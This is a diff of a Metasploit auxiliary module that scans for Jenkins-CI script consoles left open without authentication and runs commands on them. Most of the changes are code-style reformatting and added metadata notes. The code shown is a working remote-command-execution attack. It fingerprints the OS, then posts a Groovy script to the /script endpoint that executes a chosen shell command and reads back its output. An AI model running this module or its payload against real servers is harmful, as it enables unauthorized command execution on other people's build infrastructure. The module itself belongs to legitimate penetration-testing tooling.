@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'cgi'
 
 class MetasploitModule < Msf::Auxiliary
@@ -12,36 +11,43 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Jenkins-CI Unauthenticated Script-Console Scanner',
-      'Description' => %q{
-        This module scans for unauthenticated Jenkins-CI script consoles and
-        executes the specified command.
-      },
-      'Author'      =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Jenkins-CI Unauthenticated Script-Console Scanner',
+        'Description' => %q{
+          This module scans for unauthenticated Jenkins-CI script consoles and
+          executes the specified command.
+        },
+        'Author' => [
           'altonjx',
           'Jeffrey Cap'
         ],
-      'References'  =>
-        [
+        'References' => [
           ['CVE', '2015-8103'], # see link and validate, https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/ states this is another issue
           ['URL', 'https://www.jenkins.io/security/advisory/2015-11-11/'],
           ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/'],
           ['URL', 'https://www.jenkins.io/doc/book/managing/script-console/'],
         ],
-      'License'     => MSF_LICENSE
-      ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [ true, 'The path to the Jenkins-CI application', '/jenkins/' ]),
         OptString.new('COMMAND', [ true, 'Command to run in application', 'whoami' ]),
-      ])
+      ]
+    )
   end
 
   def fingerprint_os(ip)
-    res = send_request_cgi({'uri' => normalize_uri(target_uri.path,"systemInfo")})
+    res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, "systemInfo") })
 
     # Verify that we received a proper systemInfo response
     unless res && res.body.to_s.length > 0
@@ -78,12 +84,13 @@ class MetasploitModule < Msf::Auxiliary
 
     host_info = fingerprint_os(ip)
     return if host_info.nil?
+
     prefix = host_info[:prefix]
 
     request_parameters = {
-      'uri'       => normalize_uri(target_uri.path,"script"),
-      'method'    => 'POST',
-      'ctype'     => 'application/x-www-form-urlencoded',
+      'uri' => normalize_uri(target_uri.path, "script"),
+      'method' => 'POST',
+      'ctype' => 'application/x-www-form-urlencoded',
       'vars_post' =>
         {
           'script' => "def sout = new StringBuffer(), serr = new StringBuffer()\r\ndef proc = '#{prefix} #{command}'.execute()\r\nproc.consumeProcessOutput(sout, serr)\r\nproc.waitForOrKill(1000)\r\nprintln \"out> $sout err> $serr\"\r\n",
@@ -107,9 +114,9 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # The output is double-HTML encoded
-    output = CGI.unescapeHTML(CGI.unescapeHTML(command_output.to_s)).
-             gsub(/\s*(out|err)>\s*/m, '').
-             strip
+    output = CGI.unescapeHTML(CGI.unescapeHTML(command_output.to_s))
+                .gsub(/\s*(out|err)>\s*/m, '')
+                .strip
 
     if output =~ /^java\.[a-zA-Z\.]+\:\s*([^\n]+)\n/
       output = $1
@@ -121,22 +128,21 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     report_vulnerable(output)
-
   end
 
   def pattern_extract(pattern, buffer)
-    buffer.to_s.scan(pattern).map{ |m| m.first }
+    buffer.to_s.scan(pattern).map { |m| m.first }
   end
 
   def report_vulnerable(result)
     report_vuln(
-      :host   => rhost,
-      :port   => rport,
-      :proto  => 'tcp',
-      :sname  => ssl ? 'https' : 'http',
-      :name   => self.name,
-      :info   => result,
-      :refs   => self.references,
+      :host => rhost,
+      :port => rport,
+      :proto => 'tcp',
+      :sname => ssl ? 'https' : 'http',
+      :name => self.name,
+      :info => result,
+      :refs => self.references,
       :exploited_at => Time.now.utc
     )
   end
